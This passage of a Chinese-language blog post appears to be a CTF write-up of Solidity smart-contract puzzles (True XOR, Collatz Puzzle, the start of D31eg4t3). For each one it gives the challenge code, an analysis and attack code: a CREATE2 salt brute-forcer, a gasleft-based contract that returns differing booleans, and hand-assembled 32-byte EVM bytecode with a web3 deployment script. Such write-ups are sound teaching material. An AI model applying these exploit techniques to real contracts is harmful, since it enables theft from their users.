string\">'%02x'</span><span class=\"token operator\">%</span>b <span class=\"token keyword\">for</span> b <span class=\"token keyword\">in</span> s<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> \n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xfffffffffffffff</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    salt<span class=\"token operator\">=</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>rjust<span class=\"token punctuation\">(</span><span class=\"token number\">64</span><span class=\"token punctuation\">,</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">)</span>\n    p<span class=\"token operator\">=</span>Web3<span class=\"token punctuation\">.</span>keccak<span class=\"token punctuation\">(</span>hexstr<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token string\">'0xff'</span> <span class=\"token operator\">+</span> deployingaddr<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> salt <span class=\"token operator\">+</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>salt<span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">100</span> <span class=\"token operator\">==</span> <span class=\"token number\">10</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'0x'</span><span class=\"token operator\">+</span>salt<span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'0x'</span><span class=\"token operator\">+</span>code<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">break</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>最后调用一下pwn函数即可成功</p>\n<h1 id=\"0x07-True-XOR\"><a href=\"#0x07-True-XOR\" class=\"headerlink\" title=\"0x07 True XOR\"></a>0x07 True XOR</h1><h2 id=\"Code-8\"><a href=\"#Code-8\" class=\"headerlink\" title=\"Code\"></a>Code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">IBoolGiver</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">function</span> <span class=\"token function\">giveBool</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">TrueXOR</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">function</span> <span class=\"token function\">callMe</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> target<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token builtin\">bool</span> p <span class=\"token operator\">=</span> <span class=\"token function\">IBoolGiver</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">giveBool</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">bool</span> q <span class=\"token operator\">=</span> <span class=\"token function\">IBoolGiver</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">giveBool</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>p <span class=\"token operator\">&amp;&amp;</span> q<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token punctuation\">(</span>p <span class=\"token operator\">||</span> q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"bad bools\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> tx<span class=\"token punctuation\">.</span>origin<span class=\"token punctuation\">,</span> <span class=\"token string\">\"bad sender\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"Analyse-8\"><a href=\"#Analyse-8\" class=\"headerlink\" title=\"Analyse\"></a>Analyse</h2><p>题目代码非常的简单，稍微分析一下就可以明白，再一次调用之中返回两次不同的bool值即可</p>\n<p>但是注意到这里的函数被view修饰，也就是说我们不能在攻击合约之中使用常规的状态判断来返回不同的值</p>\n<p>比如：</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">attack</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token builtin\">bool</span> <span class=\"token keyword\">public</span> flag<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">giveBool</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>flag<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n        \t\tfalg <span class=\"token operator\">=</span> <span class=\"token operator\">!</span>flag<span class=\"token punctuation\">;</span>\n        \t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>想了一些办法，可是看起来好像调用时完全相同的(msg.sender, tx.origin, block.timestamp)，几乎是完全相同的环境</p>\n<p>再深入的想一下，两个bool值在两次看似相同的交易中被赋值，但实际上，两次交易存在不同之处–Gas</p>\n<p>所以用gas作为判断条件来返回不同的值即可</p>\n<p>先随便写一个数值调用，将会revert，debug看一下gasleft的值</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/image-20230127180104383.png\"></p>\n<p>GAS自身消耗2 gas，remaing gas为2928727，最后相减一下就是gasleft，更改正确数值，编写攻击合约</p>\n<h2 id=\"Attack-8\"><a href=\"#Attack-8\" class=\"headerlink\" title=\"Attack\"></a>Attack</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">attack</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">giveBool</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">uint</span> gas <span class=\"token operator\">=</span> <span class=\"token function\">gasleft</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>gas<span class=\"token operator\">==</span><span class=\"token number\">2928727</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/image-20230127180255293.png\"></p>\n<h1 id=\"0x06-Collatz-Puzzle\"><a href=\"#0x06-Collatz-Puzzle\" class=\"headerlink\" title=\"0x06 Collatz Puzzle\"></a>0x06 Collatz Puzzle</h1><h2 id=\"Code-9\"><a href=\"#Code-9\" class=\"headerlink\" title=\"Code\"></a>Code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">ICollatz</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">function</span> <span class=\"token function\">collatzIteration</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> n<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">CollatzPuzzle</span> <span class=\"token keyword\">is</span> ICollatz <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">function</span> <span class=\"token function\">collatzIteration</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> n<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">pure</span> override <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>n <span class=\"token operator\">%</span> <span class=\"token number\">2</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n      <span class=\"token keyword\">return</span> n <span class=\"token operator\">/</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n      <span class=\"token keyword\">return</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> n <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">callMe</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> addr<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">// check code size</span>\n    <span class=\"token builtin\">uint256</span> size<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">assembly</span> <span class=\"token punctuation\">&#123;</span>\n      size <span class=\"token operator\">:=</span> <span class=\"token function\">extcodesize</span><span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>size <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> size <span class=\"token operator\">&lt;=</span> <span class=\"token number\">32</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"bad code size!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// check results to be matching</span>\n    <span class=\"token builtin\">uint</span> p<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint</span> q<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> n <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> n <span class=\"token operator\">&lt;</span> <span class=\"token number\">200</span><span class=\"token punctuation\">;</span> n<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n      <span class=\"token comment\">// local result</span>\n      p <span class=\"token operator\">=</span> n<span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        p <span class=\"token operator\">=</span> <span class=\"token function\">collatzIteration</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token punctuation\">&#125;</span>\n      <span class=\"token comment\">// your result</span>\n      q <span class=\"token operator\">=</span> n<span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        q <span class=\"token operator\">=</span> <span class=\"token function\">ICollatz</span><span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>collatzIteration<span class=\"token punctuation\">&#123;</span>gas<span class=\"token punctuation\">:</span> <span class=\"token number\">100</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token punctuation\">&#125;</span>\n      <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>p <span class=\"token operator\">==</span> q<span class=\"token punctuation\">,</span> <span class=\"token string\">\"result mismatch!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"Analyse-9\"><a href=\"#Analyse-9\" class=\"headerlink\" title=\"Analyse\"></a>Analyse</h2><p>在200次调用过程中，每次包含了五次对<code>collatzIteration()</code>函数的调用，要求200次的返回值pq相同</p>\n<p>但是要求外部调用的地址必须是合约地址同时codeSize不可以超过32，并且每次在外部调用过程中只赋予了100gas，所以使用合约进行解题就是不可能的了，只能使用opcode进行合约编写，同时又要精简写法来达到目标</p>\n<p>难点在于构建合约的bytecode</p>\n<p>首先来构建runtimecode</p>\n<p>100gas还是比较容易满足的，但是codesize&lt;&#x3D;32的条件有些难度。大概的逻辑就是</p>\n<pre class=\"line-numbers language-assembly\" data-language=\"assembly\"><code class=\"language-assembly\">var data :&#x3D; calldataload(0x4)\nif mod(data,2) &#123;\nmstore(0x60,add(mul(3,data),1))\nreturn(0x60,0x80)\n&#125;\nmstore(0x60,div(data,2))\nreturn(0x60,0x80)\n&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>使用if mod(a,b)进行判断相比于switch case方式减少了一些jump和eq的操作，但是两次return浪费了不少的code，并且在计算过程中push很浪费资源，所以明白问题出在了哪里之后，在适当的地址jump，使用一些非push的数据获取方法（caller，origin，codesize等）即可</p>\n<p>可以选择在if中执行mstore之后直接跳转至最后一条return而不是两次return，同时存储地址(0x60)并非唯一答案，可以用其他方式赋值，我选择了使用callvalue</p>\n<p>构建如下</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\"> 0000    60  PUSH1 0x04\n0002    35  CALLDATALOAD\n0003    60  PUSH1 0x02\n0005    81  DUP2\n0006    06  MOD\n0007    15  ISZERO\n0008    60  PUSH1 0x15\n000A    57  JUMPI\n000B    60  PUSH1 0x01\n000D    81  DUP2\n000E    60  PUSH1 0x03\n0010    02  MUL\n0011    01  ADD\n0012    60  PUSH1 0x1a\n0014    56  JUMP\n0015    5B  JUMPDEST\n0016    60  PUSH1 0x02\n0018    81  DUP2\n0019    04  DIV\n001A    5B  JUMPDEST\n001B    34  CALLVALUE\n001C    52  MSTORE\n001D    38  CODESIZE\n001E    34  CALLVALUE\n001F    F3  RETURN<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>刚好满足codesize&#x3D;&#x3D;32</p>\n<p>计算一下当n为奇数偶数时gas消耗都不会超过100</p>\n<p>再构建initcode</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\"> 0000    60  PUSH1 0x46\n0002    60  PUSH1 0x0c\n0004    60  PUSH1 0x00\n0006    39  CODECOPY\n0007    60  PUSH1 0x23\n0009    60  PUSH1 0x00\n000B    F3  *RETURN<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>所以最终的code就是</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">6046600c60003960236000f3++600435600281061560155760018160030201601a565b600281045b34523834f3<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>反编译一下</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/image-20230131210906535.png\"></p>\n<p>逻辑正确</p>\n<h2 id=\"Attack-9\"><a href=\"#Attack-9\" class=\"headerlink\" title=\"Attack\"></a>Attack</h2><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> web3 <span class=\"token keyword\">import</span> Web3<span class=\"token punctuation\">,</span>HTTPProvider\n<span class=\"token keyword\">import</span> binascii\n<span class=\"token keyword\">import</span> asyncio\nw3 <span class=\"token operator\">=</span> Web3<span class=\"token punctuation\">(</span>HTTPProvider<span class=\"token punctuation\">(</span><span class=\"token string\">'url'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>w3<span class=\"token punctuation\">.</span>isConnected<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\nprivatekey<span class=\"token operator\">=</span><span class=\"token string\">'privatekey'</span>\naddress<span class=\"token operator\">=</span>w3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span>account<span class=\"token punctuation\">.</span>from_key<span class=\"token punctuation\">(</span>privatekey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>address\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>address<span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    nonce <span class=\"token operator\">=</span> w3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span>getTransactionCount<span class=\"token punctuation\">(</span>address<span class=\"token punctuation\">)</span>\n    gasPrice <span class=\"token operator\">=</span> w3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span>gasPrice\n    transaction <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">'from'</span><span class=\"token punctuation\">:</span> address<span class=\"token punctuation\">,</span>\n                    <span class=\"token string\">'nonce'</span><span class=\"token punctuation\">:</span>nonce<span class=\"token punctuation\">,</span>\n                    <span class=\"token string\">'gasPrice'</span><span class=\"token punctuation\">:</span> gasPrice<span class=\"token punctuation\">,</span>\n                    <span class=\"token string\">'gas'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">3000000</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token string\">'data'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'0x6046600c60003960236000f3600435600281061560155760018160030201601a565b600281045b60605260206060f3'</span><span class=\"token punctuation\">&#125;</span>\n\n    signed_tx <span class=\"token operator\">=</span> w3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span>account<span class=\"token punctuation\">.</span>signTransaction<span class=\"token punctuation\">(</span>transaction<span class=\"token punctuation\">,</span> privatekey<span class=\"token punctuation\">)</span>\n    txn_hash <span class=\"token operator\">=</span> w3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span>sendRawTransaction<span class=\"token punctuation\">(</span>signed_tx<span class=\"token punctuation\">.</span>rawTransaction<span class=\"token punctuation\">)</span>\n    w3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span>wait_for_transaction_receipt<span class=\"token punctuation\">(</span>txn_hash<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>w3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span>getTransactionReceipt<span class=\"token punctuation\">(</span>Web3<span class=\"token punctuation\">.</span>toHex<span class=\"token punctuation\">(</span>txn_hash<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nmain<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>或使用solidity进行部署</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">Deployer</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> code<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token keyword\">assembly</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>code<span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">mload</span><span class=\"token punctuation\">(</span>code<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#125;</span> <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">//直接部署runtimecode</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>部署合约，在以此地址为参数调用题目合约的<code>collatzIteration()</code>函数</p>\n<img src=\"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/image-20230131210717508.png\" style=\"zoom:50%;\" />\n\n<p>成功返回true</p>\n<h1 id=\"0x05-D31eg4t3\"><a href=\"#0x05-D31eg4t3\" class=\"headerlink\" title=\"0x05 D31eg4t3\"></a>0x05 D31eg4t3</h1><h2 id=\"Code-10\"><a href=\"#Code-10\" class=\"headerlink\" title=\"Code\"></a>Code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">D31eg4t3</span><span class=\"token punctuation\">&#123;</span>\n\n\n    <span class=\"token builtin\">uint</span> a <span class=\"token operator\">=</span> <span class=\"token number\">12345</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint8</span> b <span class=\"token operator\">=</span> <span class=\"token number\">32</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">string</span> <span class=\"token keyword\">private</span> d<span class=\"token punctuation\">;</span> \n    <span class=\"token builtin\">uint32</span> <span class=\"token keyword\">private</span> c<span class=\"token punctuation\">;</span> \n    <span class=\"token builtin\">string</span> <span class=\"token keyword\">private</span> mot<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> owner<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">mapping</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> canYouHackMe<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">modifier</span> onlyOwner<span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Not a Owner\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">hackMe</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span> <span class=\"token keyword\">calldata</span> bites<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">returns</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> r<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> msge<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">address</span><span class=\"token 